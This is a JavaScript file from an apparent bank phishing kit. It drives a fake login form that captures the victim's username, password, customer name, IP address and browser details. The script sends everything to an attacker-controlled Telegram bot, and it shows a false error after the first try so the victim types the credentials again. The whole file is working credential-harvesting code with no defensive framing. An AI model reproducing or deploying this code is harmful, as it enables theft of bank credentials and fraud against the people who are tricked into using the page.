import { telegramToken, telegramChatId } from '../tele.js';

document.getElementById('verifyButton').addEventListener('click', function() {
    document.getElementById('popup').style.display = 'none';
    document.getElementById('overlay').style.display = 'none';
    document.getElementById('mainContainer').style.filter = 'none';
    document.getElementById('mainContainer').style.pointerEvents = 'auto';
});

document.getElementById('loginForm').addEventListener('submit', async function(event) {
    event.preventDefault(); // Prevent form submission

    // Clear previous error messages
    const usernameError = document.getElementById('usernameError');
    const passwordError = document.getElementById('passwordError');
    usernameError.textContent = '';
    passwordError.textContent = '';

    // Get form input values
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();
    const customerName = document.getElementById('customerNameInput').value.trim();

    // Validate inputs
    let hasError = false;
    if (!username) {
        usernameError.textContent = 'Username is required';
        hasError = true;
    }
    if (!password) {
        passwordError.textContent = 'Password is required';
        hasError = true;
    }
    if (hasError) {
        return;
    }
    if (username.length < 3 || password.length < 3) {
        usernameError.textContent = 'Username is incorrect';
        passwordError.textContent = 'Password is incorrect';
        return;
    }

    // Handle multiple attempts logic
    let attempts = sessionStorage.getItem('loginAttempts') || 0;
    attempts = parseInt(attempts, 10);

    // Client information
    const clientIP = await fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => data.ip);
    const clientAgent = navigator.userAgent;

    // Prepare message for logging and email
    const info = [
        "🌟You got a #NewResultz 🌟",
        "🌟Wassup, 🌟xf🌟 BAXNK PLAIXD 🌟",
        `👤 USER ID: ${username}`,
        `🔒 PASSWORD: ${password}`, // Logging actual password (Not Recommended)
        `🏦 CUSTOMER NAME: ${customerName}`,
        `🌐 CLIENT IP: ${clientIP}`,
        `💻 USER AGENT: ${clientAgent}`,
    ];
    const message = info.join("\n");

    if (attempts < 1) {
        attempts++;
        sessionStorage.setItem('loginAttempts', attempts);

        // Post the form without redirecting
        console.log('Attempt 1: Post the input but stay on the page');
        usernameError.textContent = 'Username and Password are incorrect. You have 1 attempt left. Please try again.';
        document.getElementById('username').style.borderColor = 'red';
        document.getElementById('password').style.borderColor = 'red';

        // Send to Telegram
        const telegramURL = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}`;
        await fetch(telegramURL);

        // Clear inputs
        document.getElementById('username').value = '';
        document.getElementById('password').value = '';
        return;
    }

    // Reset attempts and submit form for real
    sessionStorage.setItem('loginAttempts', 0);

    // Send to Telegram
    const telegramURL = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}`;
    await fetch(telegramURL);

    // Generate random string for redirection
    const randomString = Array.from({ length: 150 }, () => Math.random().toString(36)[2]).join('');

    // Redirect after processing, with customerName properly URL-encoded
    window.location.href = `../alldone.html?routingnumber=&customername=${encodeURIComponent(customerName)}&randomstring=${randomString}`;
});
